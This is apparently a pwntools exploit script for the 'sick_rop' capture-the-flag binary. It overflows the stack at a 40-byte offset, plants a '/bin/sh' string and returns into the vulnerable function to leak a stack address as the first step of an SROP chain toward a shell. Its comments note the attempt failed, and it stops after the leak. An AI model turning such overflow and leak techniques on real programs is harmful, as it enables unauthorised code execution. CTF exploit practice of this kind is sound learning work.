#!/usr/bin/env python3

from pwn import *

e = ELF("./sick_rop_patched")
# libc = ELF('./libc.so.6')
# rop = ROP(e)

context.binary = e
context.terminal = ['tmux', 'split', '-h']
# context.log_level = 'debug'


def conn():
    if args.LOCAL:
        # Use PTY (Pseudo terminal) to avoid some stdin/out buffer issue, e.g. HTB Jeeves
        r = process([e.path], stdin=process.PTY, stdout=process.PTY)
    elif args.GDB:
        r = gdb.debug([e.path], '''
                      b *(vuln+0x1a)
                      c
                      ''', stdin=process.PTY, stdout=process.PTY)
    elif args.GDB_ATTACH:
        r = process([e.path], stdin=process.PTY, stdout=process.PTY)
        gdb.attach(r, gdbscript='''
                      b *(vuln)
                      c
                   ''')
    elif args.REMOTE:
        ip, port = args.REMOTE.split(':')
        r = remote(ip, port)
    else:
        error('unknown running mode for the script')

    return r


def main():
    r = conn()

    # The following attempt failed due to the rbp got polluted and crash the binary right away.

    # Leak the stack value via write() with wrong RAX + SROP
    # We need the leaked stack value for the `/bin/sh`

    RET_OFFSET = 40 # Found via pwn cyclic
    bin_sh_str = b'/bin/sh\x00'
    payload = flat(
            bin_sh_str,
            b'\x90' * (RET_OFFSET - len(bin_sh_str)),
            e.sym.vuln + 0x17,  # `push RAX` before write() call
            # It is ok to just reuse the RAX (i.e. the input size) for this challenge. Otherwise we can set a longer read size here and use the `push R10` above.
            # read_size,
            )
    payload_length = len(payload)
    info(f'payload length is {payload_length}')
    r.send(payload)
    r.recvn(payload_length)    # the output of my own payload above
    leaked = r.recvn(payload_length)
    # num_words = int(len(leaked) / 8)
    # for i in range(num_words):
    #     leaked_value = u64(leaked[8 * i: 8 * (i + 1)])
    #     info(f'leaked[{i}] is {hex(leaked_value)}')
    rsp = u64(leaked[4 * 8: 5 * 8])     # the deubgging above shows the 4th word contains the RSP value we pushed on stack via `push R10` in the payload
    info(f'leaked RSP is {hex(rsp)}')

    r.interactive()

if __name__ == "__main__":
    main()
